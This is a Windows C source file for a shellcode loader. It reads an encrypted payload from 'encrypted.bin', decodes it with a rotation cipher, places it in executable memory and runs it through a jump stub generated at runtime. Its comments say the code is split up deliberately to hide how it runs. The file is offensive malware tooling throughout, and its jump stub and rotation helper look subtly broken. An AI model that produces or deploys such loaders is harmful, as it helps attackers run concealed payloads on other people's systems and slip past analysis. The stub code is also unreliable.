//#include "stdafx.h"  // Uncomment if using Visual Studio precompiled headers
#include "Windows.h"
#include <stdio.h>
#include <stdlib.h>

// Split the ROT function into two parts
// Original code had a single function `rot_n`. This version splits it into `rot_part1` and `rot_part2`,
// making it harder to understand the ROT logic as it is spread across multiple parts.
void rot_part1(unsigned char *b);
void rot_part2(unsigned char *b, int r);

// Split the main logic into smaller pieces
// In the original code, the main function contained the majority of the program's logic.
// Here, the logic is split into modular functions (`read_file`, `decrypt_shellcode`, `execute_shellcode`)
// to obscure the flow of execution.
void read_file(const char *filename, unsigned char **shellcode, long *file_size);
void decrypt_shellcode(unsigned char *shellcode, long size, int rotation_value);
void execute_shellcode(void *exec, unsigned char *shellcode, long size);

int main() {
    const char *filename = "encrypted.bin";
    unsigned char *shellcode = NULL;
    long file_size = 0;

    // Read file and allocate memory for shellcode
    read_file(filename, &shellcode, &file_size);
    if (!shellcode) return 1;

    // Allocate memory for the final executable shellcode
    // The logic for memory allocation and execution is kept here, but `decrypt_shellcode` and `execute_shellcode` are called.
    void *exec = VirtualAlloc(NULL, file_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        fprintf(stderr, "Error: VirtualAlloc failed!\n");
        free(shellcode);
        return 1;
    }

    // Decrypt the shellcode
    decrypt_shellcode(shellcode, file_size, 33);

    // Execute the shellcode using dynamically generated execution logic
    execute_shellcode(exec, shellcode, file_size);

    // Cleanup
    free(shellcode);
    VirtualFree(exec, 0, MEM_RELEASE);
    return 0;
}

// Split ROT function
// Original code used a single `rot_n` function to perform ROT encryption or decryption.
// This version splits it into two parts to obfuscate the logic further.
void rot_part1(unsigned char *b) {
    *b += 256;  // Add 256 to ensure non-negative results
}
void rot_part2(unsigned char *b, int r) {
    rot_part1(b);  // Call part 1
    *b = (*b + r) % 256;  // Rotate and wrap around
}

// Split file reading logic
// Original code read the file directly in `main`. Here, it's moved to a dedicated function `read_file`,
// making the flow of operations less clear in `main`.
void read_file(const char *filename, unsigned char **shellcode, long *file_size) {
    FILE *file = fopen(filename, "rb");
    if (file == NULL) {
        perror("Error opening file");
        return;
    }

    // Get the size of the file
    fseek(file, 0, SEEK_END);
    *file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    if (*file_size <= 0) {
        fprintf(stderr, "Error: File size is invalid!\n");
        fclose(file);
        return;
    }

    // Allocate memory for the shellcode array
    *shellcode = (unsigned char *)malloc(*file_size);
    if (*shellcode == NULL) {
        fprintf(stderr, "Error: Memory allocation failed!\n");
        fclose(file);
        return;
    }

    // Read the encrypted shellcode into memory
    if (fread(*shellcode, 1, *file_size, file) != *file_size) {
        fprintf(stderr, "Error: File read failed!\n");
        free(*shellcode);
        *shellcode = NULL;
    }
    fclose(file);
}

// Decrypt shellcode
// Original decryption logic was in `main`. Here, it's moved to a separate function and uses `rot_part2`,
// which in turn calls `rot_part1`, creating an extra layer of obfuscation.
void decrypt_shellcode(unsigned char *shellcode, long size, int rotation_value) {
    printf("Decrypted shellcode bytes:\n");
    for (long i = 0; i < size; i++) {
        rot_part2(&shellcode[i], -rotation_value);  // Decrypt the byte
        printf("%02x ", shellcode[i]);  // Print decrypted byte
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");
}

// Dynamically execute shellcode
// Original code directly executed the shellcode via a function pointer. This version generates a small
// piece of machine code dynamically at runtime, which obscures the execution logic further.
void execute_shellcode(void *exec, unsigned char *shellcode, long size) {
    // Copy the decrypted shellcode into executable memory
    memcpy(exec, shellcode, size);

    printf("Shellcode in executable memory. Press Enter to execute...\n");
    getchar();

    // Dynamically generate execution logic
    unsigned char *dynamic_code = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (dynamic_code) {
        // Simple stub that jumps to `exec` memory
        dynamic_code[0] = 0xFF;  // JMP opcode
        dynamic_code[1] = 0x25;  // ModRM byte for absolute address
        *(void **)(dynamic_code + 2) = exec;  // Address of shellcode

        // Execute dynamically generated code
        ((void(*)())dynamic_code)();

        VirtualFree(dynamic_code, 0, MEM_RELEASE);
    } else {
        fprintf(stderr, "Error: Failed to allocate memory for dynamic code execution!\n");
    }
}